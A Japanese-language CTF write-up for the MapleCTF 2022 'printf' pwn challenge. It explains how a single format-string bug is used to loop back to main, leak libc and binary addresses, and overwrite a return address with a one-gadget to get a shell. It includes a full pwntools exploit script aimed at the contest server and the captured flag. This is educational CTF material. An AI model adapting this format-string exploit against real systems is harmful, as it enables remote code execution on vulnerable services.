# MapleCTF 2022 `printf [pwn]` writeup

## 問題
Just one printf call. Please send me interesting solutions!

`nc printf.ctf.maplebacon.org 1337`

実行ファイルが配布される。

## 解法
セキュリティ機構の確認。

```
[*] '/home/caffeine/ctf/maplectf22/pwn/printf/chal'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

canaryはないが、BOFのバグはなかった。

代わりにあるのはFormat string bugs (FSB)。
但し入力、出力ともに1度きり。
FSBのあるprintf関数はmain() -> ready() -> set() -> go()といくつかの関数を潜った先にある。
printf関数が呼び出される直前のスタックの状態は以下の通り (本来はASLRが有効なのでスタックのアドレスはランダム)。

```
00:0000│ rbp rsp 0x7fffffffdef0 —▸ 0x7fffffffdf00 —▸ 0x7fffffffdf10 —▸ 0x7fffffffdf20 ◂— 0x0
01:0008│         0x7fffffffdef8 —▸ 0x5555555551f2 (set+18) ◂— nop
02:0010│         0x7fffffffdf00 —▸ 0x7fffffffdf10 —▸ 0x7fffffffdf20 ◂— 0x0
03:0018│         0x7fffffffdf08 —▸ 0x555555555207 (ready+18) ◂— nop
04:0020│         0x7fffffffdf10 —▸ 0x7fffffffdf20 ◂— 0x0
05:0028│         0x7fffffffdf18 —▸ 0x55555555524e (main+68) ◂— mov    eax, 0
06:0030│         0x7fffffffdf20 ◂— 0x0
07:0038│         0x7fffffffdf28 —▸ 0x7ffff7dea083 (__libc_start_main+243) ◂— mov    edi, eax
```

保存されたrbpがリストになっているので、以下の手順でFormat string attack (FSA)によるアドレスリーク及びret2mainを狙う。

1. スタックの0番目 (つまりスタックのトップ)のアドレスを参照して、`\xX8`を書き込む。
   + 上の例だと、スタックの2番目のアドレスが`0x7fffffffdfX8`になる。
2. スタックの2番目のアドレスを参照して、`\x49`を書き込む。
   + ここで`0x7fffffffdfX8`が`0x7fffffffdf08`もしくは`0x7fffffffdf18`と一致すると、リターンアドレスが書き変わってmain()からもう一度ready()が呼ばれる。成功確率は1/8。
3. スタック上の適当なアドレスを拾ってきて、libcやスタックのアドレスをリークしておく。

これが成功すれば、絶対アドレスを把握したうえでFSAによる任意アドレス書き込みができる状態になる。
シェルを取るのは容易だ。

## Exploit
FSAを利用して予めlibcのアドレスをいくつかリークし、そのオフセットからlibcのバージョンに目星を付けておく。
今回はリターンアドレスをlibc上のone gadgetに書き換えてシェルを取った。
FSAでは大きな値の書き込みに時間がかかるので、1 or 2 Bずつ書き込むのが吉。
```py
from pwn import *
import sys

elf = ELF("chal")
libc = ELF("/usr/lib/x86_64-linux-gnu/libc-2.31.so")

# io = process(elf.path)
io = remote("printf.ctf.maplebacon.org", 1337)

# gdb.attach(io)

one_gadget1 = 0xe3afe
one_gadget2 = 0xe3b01
one_gadget3 = 0xe3b04

payload = b"%c" * 4
payload += b"%52c"
payload += b"%hhn"
payload += b"%17c"
payload += b"%8$hhn"
payload += b"%11$p"
payload += b"AAAA"
payload += b"%13$p"
payload += b"AAAA"
io.sendline(payload)

ret = io.recvuntil(b"AAAA")
elf.address = int(ret[-16:-4].decode(), 16) - 68 - elf.sym["main"]
ret = io.recvuntil(b"AAAA")
libc.address = int(ret[-16:-4].decode(), 16) - 243 - libc.sym["__libc_start_main"]
print("elf addr: " + str(hex(elf.address)))
print("libc addr: " + str(hex(libc.address)))

b = (((libc.address + one_gadget2) >> 16) & 0xff) - 90
payload =  b"%c" * 4
payload += b"%86c"
payload += b"%hhn"
payload += b"%%%dc%%hhn" % b
b = ((elf.sym["main"] + 63) & 0xffff) - b - 90
payload += b"%%%dc%%hn" % b
io.sendline(payload)

b = ((libc.address + one_gadget2) & 0xffff) - 88
payload =  b"%c" * 4
payload += b"%84c"
payload += b"%hhn"
payload += b"%%%dc%%hn" % b
io.sendline(payload)

io.interactive()
```

FLAG: `maple{F0wm47_57w1ng_3xpl01t_UwU}`